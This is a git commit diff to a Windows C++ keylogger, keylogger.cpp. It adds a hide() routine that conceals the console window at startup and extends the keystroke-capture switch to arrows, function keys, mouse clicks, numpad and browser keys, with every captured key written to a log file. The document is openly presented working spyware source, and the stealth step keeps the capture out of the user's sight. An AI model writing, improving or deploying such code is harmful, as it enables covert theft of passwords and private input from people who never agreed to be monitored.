4d3b5f5dbe25287749415102bbd8f7ae304b1204
Kiran Shenoy P.H <33525945+KiranShny@users.noreply.github.com>
2017-11-30 14:28:12 +0530

    Update keylogger.cpp

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,8 +1,23 @@
+//============================================================================
+// Name        : keylogger.cpp
+// Author      : KiranShny
+// Version     : Initial
+// Copyright   : copyrights@2017 KiranShny
+// Description : Keylogger using c++ [IDE USED: ECLIPSE]
+// Requirements: windows.h,winuser.h [OS : WINDOWS]
+//============================================================================
 #include<iostream>
 #include<fstream>
 #include<winuser.h>
 #include<windows.h>
+#include<wincon.h>
 using namespace std;
+void hide() {
+	HWND stealth;
+	AllocConsole();
+	stealth=FindWindowA("ConsoleWindowClass",NULL);
+	ShowWindow(stealth,0);
+}
 void log() {
 	char key;
 	for (;;) {
@@ -20,12 +35,6 @@ void log() {
 					break;
 				} else {
 					switch (key) {
-					case 49:
-						if (GetAsyncKeyState(0x10))
-							write << "!";
-						else
-							write << "1";
-						break;
 					case 48:
 						if (GetAsyncKeyState(0x10))
 							write << ")";
@@ -85,40 +94,168 @@ void log() {
 							write << "(";
 						else
 							write << "9";
-					case 8:
-						write << "<BACKSPACE>";
 						break;
-					case 9:
-						write << "<HRTAB>";
+					case VK_SPACE:
+						write<<" ";
+					    break;
+					case VK_RETURN:
+						write<<"<ENTER>\n";
 						break;
-					case 10:
-						write << "<NEWLINE>";
+					case VK_TAB:
+						write<<"<TAB>\t";
 						break;
-					case 11:
-						write << "<VRTAB>";
+					case VK_BACK:
+						write<<"<BACKSPACE>";
 						break;
-					case 13:
-						write << "<ENTER>\n";
+					case VK_ESCAPE:
+						write<<"<ESC>";
 						break;
-					case 14:
-						write << "<SHIFTOUT>";
+					case VK_LBUTTON:
+						write<<"<LeftClick>";
 						break;
-					case 15:
-						write << "<SHIFTIN>";
+					case VK_RBUTTON:
+						write<<"<RightClick>";
 						break;
-					case 24:
-						write << "<CANCEL>";
+					case VK_MBUTTON:
+						write<<"<MiddleButton>";
 						break;
-					case 27:
-						write << "<ESC>";
+					case VK_SHIFT:
+						write<<"<SHIFT>";
 						break;
-					case 127:
-						write << "<DEL>";
+					case VK_CONTROL:
+						write<<"<CTRL>";
 						break;
-					case 32:
-						write << " ";
+					case VK_CAPITAL:
+						write<<"<CAPSLOCK>";
 						break;
-					default:
+					case VK_END:
+						write<<"<END>";
+						break;
+					case VK_HOME:
+						write<<"<HOME>";
+						break;
+					case VK_LEFT:
+						write<<"<LEFT>";
+						break;
+					case VK_UP:
+						write<<"<UP>";
+						break;
+					case VK_RIGHT:
+						write<<"<RIGHT>";
+						break;
+					case VK_DOWN:
+						write<<"<DOWN>";
+						break;
+					case VK_SNAPSHOT:
+						write<<"<PRT.SCR>";
+						break;
+					case VK_INSERT:
+						write<<"<INSERT>";
+						break;
+					case VK_DELETE:
+						write<<"<DELETE>";
+						break;
+					case VK_LWIN:
+						write<<"<LEFT.WIN.KEY>";
+						break;
+					case VK_RWIN:
+						write<<"<RIGHT.WIN.KEY>";
+						break;
+					case VK_NUMPAD0:
+						write<<"<NUM0>";
+						break;
+					case VK_NUMPAD1:
+						write<<"<NUM1>";
+						break;
+					case VK_NUMPAD2:
+						write<<"<NUM2>";
+						break;
+					case VK_NUMPAD3:
+						write<<"<NUM3>";
+						break;
+					case VK_NUMPAD4:
+						write<<"<NUM4>";
+						break;
+					case VK_NUMPAD5:
+						write<<"<NUM5>";
+						break;
+					case VK_NUMPAD6:
+						write<<"<NUM6>";
+						break;
+					case VK_NUMPAD7:
+						write<<"<NUM7>";
+						break;
+					case VK_NUMPAD8:
+						write<<"<NUM8>";
+						break;
+					case VK_NUMPAD9:
+						write<<"<NUM9>";
+						break;
+					case VK_ADD:
+						write<<"<+>";
+						break;
+					case VK_SUBTRACT:
+						write<<"<->";
+						break;
+					case VK_MULTIPLY:
+						write<<"<*>";
+						break;
+					case VK_DIVIDE:
+						write<<"</>";
+						break;		\
+					case VK_F1:
+						write<<"<F1>";
+						break;
+					case VK_F2:
+						write<<"<F2>";
+						break;
+					case VK_F3:
+						write<<"<F3>";
+						break;
+					case VK_F4:
+						write<<"<F4>";
+						break;
+					case VK_F5:
+						write<<"<F5>";
+						break;
+					case VK_F6:
+						write<<"<F6>";
+						break;
+					case VK_F7:
+						write<<"<F7>";
+						break;
+					case VK_F8:
+						write<<"<F8>";
+						break;
+					case VK_F9:
+						write<<"<F9>";
+						break;
+					case VK_F10:
+						write<<"<F10>";
+						break;
+					case VK_F11:
+						write<<"<F11>";
+						break;
+					case VK_F12:
+						write<<"<F12>";
+						break;
+					case VK_NUMLOCK:
+						write<<"<NUMLOCK>";
+						break;
+					case VK_SCROLL:
+						write<<"<SCROLLOCK>";
+						break;
+					case VK_BROWSER_BACK:
+						write<<"<BROWSER-BACK>";
+						break;
+					case VK_BROWSER_REFRESH:
+						write<<"<BROWSER-REFRESH>";
+						break;
+					case VK_BROWSER_STOP:
+						write<<"<BROWSER-STOP>";
+						break;
+					case VK_BROWSER_SEARCH:
+						write<<"<BROWSER-SEARCH>";
 						break;
 					}
 				}
@@ -127,6 +264,8 @@ void log() {
 	}
 }
 int main() {
+	hide();
 	log();
 	return 0;
 }
+
